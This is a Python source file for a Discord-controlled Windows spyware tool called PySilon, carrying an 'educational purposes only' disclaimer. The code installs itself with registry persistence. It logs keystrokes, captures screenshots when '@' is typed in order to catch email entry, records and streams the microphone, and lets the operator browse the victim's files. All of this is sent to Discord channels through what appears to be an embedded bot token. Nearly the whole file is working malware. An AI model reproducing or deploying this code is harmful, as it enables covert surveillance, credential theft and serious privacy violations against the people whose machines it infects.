import discord
from pynput.keyboard import Key, Listener
from shutil import copy2
import os
import sys
from PIL import ImageGrab
from pathlib import Path
from itertools import islice
import time
from getpass import getuser
import pyaudio
import asyncio
import sounddevice
from scipy.io.wavfile import write
from threading import Thread
import winreg
import pyautogui
from resources.misc import *

#############################################################################
#                                                                           #
#   DISCLAIMER !!! READ BEFORE USING                                        #
#                                                                           #
#   Information and code provided in this project are                       #
#   for educational purposes only. The creator is no                        #
#   way responsible for any direct or indirect damage                       #
#   caused due to the misusage of the information.                          #
#                                                                           #
#   Everything you do, you are doing at your own risk and responsibility.   #
#                                                                           #
#############################################################################

# ----------- Begin of config ---------- #
# - Please check out README.md before  - #
# -   you change following settings    - #

bot_token = 'NzQ2ODMyMjU1OTE3NDkwMTg2.X0GDvQ.6NO59zJzo9w37fKC3z8CxboE9Sk'   # Paste here BOT-token
software_registry_name = 'PySilon'   # -------------------------------------------- Software name shown in registry
software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name

channel_ids = {
    'main': 831567586344697868,   # Paste here main channel ID for general output
    'spam': 831567654145097769,   # Paste here spam channel ID for filter key spamming (mostly while target play game)
    'file': 832701499301691423,   # Paste here file-related channel ID for browsing, downloading and uploading files
    'recordings': 831567740622995457,   # Paste here recording channel ID for microphone recordings storing
    'voice': 851570974867849257   # Paste here voice channel ID for realtime microphone intercepting
}

# -            End of config           - #
# - Don't change anything below unless - #
# - you know exacly what are you doing - #
# -------------------------------------- #

client = discord.Client(intents=discord.Intents.all())
ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
text_buffor, force_to_send = '', False
messages_to_send, files_to_send, embeds_to_send = [], [], []
working_directory = sys.argv[0].split('\\')[:-1]

if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
    try: os.mkdir('C:\\Users\\' + getuser() + '\\' + software_directory_name)
    except: pass
    copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    winreg.CloseKey(registry_key)

@client.event
async def on_ready():
    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids
    await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```[' + current_time() + '] New PC session```')

    recording_channel_last_message = await discord.utils.get(client.get_channel(channel_ids['recordings']).history())

    if recording_channel_last_message.content != 'disable':
        Thread(target=start_recording).start()
        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Starting recording...`')
    else:
        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Recording disabled. If you want to enable it, just delete last message on` <#' + str(channel_ids['recordings']) + '>')
    
    while True:
        if len(messages_to_send) > 0:
            for message in messages_to_send:
                await client.get_channel(message[0]).send(message[1])
                await asyncio.sleep(0.1)
            messages_to_send = []
        if len(files_to_send) > 0:
            for file in files_to_send:
                await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
                await asyncio.sleep(0.1)
                if file[3]:
                    os.system('del ' + file[2])
            files_to_send = []
        if len(embeds_to_send) > 0:
            for embedd in embeds_to_send:
                await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1]).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                await asyncio.sleep(0.1)
            embeds_to_send = []
        await asyncio.sleep(1)

@client.event
async def on_raw_reaction_add(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member
    
    if user.bot == False:
        if str(reaction) == '📌':
            await message.pin()
            last_message = await discord.utils.get(message.channel.history())
            await last_message.delete()
        elif str(reaction) == '🔴':
            await message.delete()

@client.event
async def on_raw_reaction_remove(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member

    if str(reaction) == '📌':
        await message.unpin()

@client.event
async def on_message(message):
    global channel_ids, vc, working_directory

    if message.content == '.ss':
        await message.delete()
        ImageGrab.grab(all_screens=True).save('ss.png')
        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
        os.system('del ss.png')

    elif message.content == '.join':
        await message.delete()
        vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
        vc.play(PyAudioPCM())
        await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')

    elif message.content == '.tree':
        await message.delete()
        if message.channel.id == channel_ids['file']:
            tree_messages = []

            dir_path = Path('/'.join(working_directory))
            tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
            with open('tree.txt', 'w', encoding='utf-8') as system_tree:
                system_tree.write(str(dir_path) + '\n')

            length_limit = sys.maxsize
            iterator = tree(Path('/'.join(working_directory)))

            tree_message_content = '```^\n'
            for line in islice(iterator, length_limit):
                with open('tree.txt', 'a+', encoding='utf-8') as system_tree:
                    system_tree.write(line + '\n')
                if len(tree_message_content) > 1800:
                    tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
                    tree_message_content = '```'
                else:
                    tree_message_content += str(line) + '\n'
            if tree_message_content != '```':
                tree_messages.append(await message.channel.send(tree_message_content + '```'))
            
            reactionMsg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
            await reactionMsg.add_reaction('📥')
            await reactionMsg.add_reaction('🔴')
        else:
            reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

    elif message.content[:3] == '.cd':
        await message.delete()
        if message.channel.id == channel_ids['file']:
            if message.content == '.cd':
                reaction_msg = await message.channel.send('```Syntax: .cd <directory>```'); await reaction_msg.add_reaction('🔴')
            else:
                if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
                    if message.content[4:] == '..':
                        working_directory.pop(-1)
                    else:
                        working_directory.append(message.content[4:])
                    reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')

        else:
            reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

    elif message.content == '.pwd':
        reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')

class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        p = pyaudio.PyAudio()
        self.chunks = chunk
        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)

    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)


def start_recording():
    global files_to_send, channel_ids
    while True:
        recorded_mic = sounddevice.rec(int(120 * 16000), samplerate=16000, channels=1)
        sounddevice.wait()
        try: os.mkdir('rec_')
        except: pass
        record_name = 'rec_\\' + current_time() + '.wav'
        write(record_name, 16000, recorded_mic)
        files_to_send.append([channel_ids['recordings'], '', record_name, True])

def on_press(key):
    global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
    processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
    if processed_key in ctrl_codes.keys():
        processed_key = ' `' + ctrl_codes[processed_key] + '`'
    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
        match processed_key:
            case Key.space: processed_key = ' '
            case Key.shift: processed_key = ' *`SHIFT`*'
            case Key.tab: processed_key = ' *`TAB`*'
            case Key.backspace: processed_key = ' *`<`*'
            case Key.enter: processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
            case Key.print_screen|'@':
                processed_key = ' *`Print Screen`*'
                ImageGrab.grab(all_screens=True).save('ss.png')
                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == Key.print_screen else ' `[Email typing]`'), 'ss.png'])
        text_buffor += str(processed_key)
        if len(text_buffor) > 1975:
            if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
                messages_to_send.append([channel_ids['spam'], text_buffor])
            else:
                messages_to_send.append([channel_ids['main'], text_buffor])
            text_buffor = ''

with Listener(on_press=on_press) as listener:
    client.run(bot_token)
    listener.join()
